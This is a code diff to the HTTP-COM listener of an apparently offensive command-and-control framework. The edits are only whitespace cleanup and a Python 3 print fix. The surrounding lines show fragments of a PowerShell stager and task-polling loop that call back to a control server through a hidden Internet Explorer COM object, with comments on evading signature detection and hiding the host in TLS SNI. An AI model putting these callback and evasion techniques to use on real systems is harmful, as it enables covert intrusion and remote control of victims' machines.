@@ -144,7 +144,7 @@ class Listener:
          """
          Returns an IIS 7.5 404 not found page.
          """
-    
+
          return '\n'.join([
              '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
              '<html xmlns="http://www.w3.org/1999/xhtml">',
@@ -176,7 +176,7 @@ class Listener:
              '</body>',
              '</html>',
              ' ' * self.header_offset,  # randomize the length of the header to evade signature based detection
-         ]) 
+         ])
 
     def index_page(self):
         """
@@ -303,7 +303,7 @@ class Listener:
                         if "https" in host:
                             host = 'https://' + '[' + str(bindIP) + ']' + ":" + str(port)
                         else:
-                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port) 
+                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port)
 
                 # code to turn the key string into a byte array
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
@@ -328,7 +328,7 @@ class Listener:
                     for header in customHeaders:
                         headerKey = header.split(':')[0]
                         headerValue = header.split(':')[1]
-                        
+
                         if headerKey.lower() == "host":
                             modifyHost = True
 
@@ -339,7 +339,7 @@ class Listener:
                 #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                 if modifyHost:
                     stager += helpers.randomize_capitalization("$ie.navigate2($ser,$fl,0,$Null,$Null);while($ie.busy){Start-Sleep -Milliseconds 100};")
-                
+
                 stager += "$ie.navigate2($ser+$t,$fl,0,$Null,$c);"
                 stager += "while($ie.busy){Start-Sleep -Milliseconds 100};"
                 stager += "$ht = $ie.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $ie.document, $Null).InnerHtml;"
@@ -380,7 +380,7 @@ class Listener:
         host = listenerOptions['Host']['Value']
         workingHours = listenerOptions['WorkingHours']['Value']
         customHeaders = profile.split('|')[2:]
-        
+
         # select some random URIs for staging from the main profile
         stage1 = random.choice(uris)
         stage2 = random.choice(uris)
@@ -507,7 +507,7 @@ class Listener:
 
         if language:
             if language.lower() == 'powershell':
-                
+
                 updateServers = """
                     $Script:ControlServers = @("%s");
                     $Script:ServerIndex = 0;
@@ -522,7 +522,7 @@ class Listener:
                     }
 
                 """ % (listenerOptions['Host']['Value'])
-                
+
                 getTask = """
                     function script:Get-Task {
                         try {
@@ -576,7 +576,7 @@ class Listener:
                                 $Headers = ""
                                 $script:Headers.GetEnumerator()| %{ $Headers += "`r`n$($_.Name): $($_.Value)" }
                                 $Headers.TrimStart("`r`n")
-                                
+
                                 try {
                                     # choose a random valid URI for checkin
                                     $taskURI = $script:TaskURIs | Get-Random
@@ -656,7 +656,7 @@ class Listener:
             """
             Return default server web page if user navigates to index.
             """
-            
+
             static_dir = self.mainMenu.installPath + "data/misc/"
             return make_response(self.index_page(), 200)
 
@@ -796,7 +796,8 @@ class Listener:
                 app.run(host=bindIP, port=int(port), threaded=True)
 
         except Exception as e:
-            print helpers.color("[!] Listener startup on port %s failed: %s " % (port, e))
+            print(helpers.color("[!] Listener startup on port %s failed: %s " % (port, e)))
+            print(helpers.color("[!] Ensure the folder specified in CertPath exists and contains your pem and private key file."))
             dispatcher.send("[!] Listener startup on port %s failed: %s " % (port, e), sender='listeners/http_com')
 
 
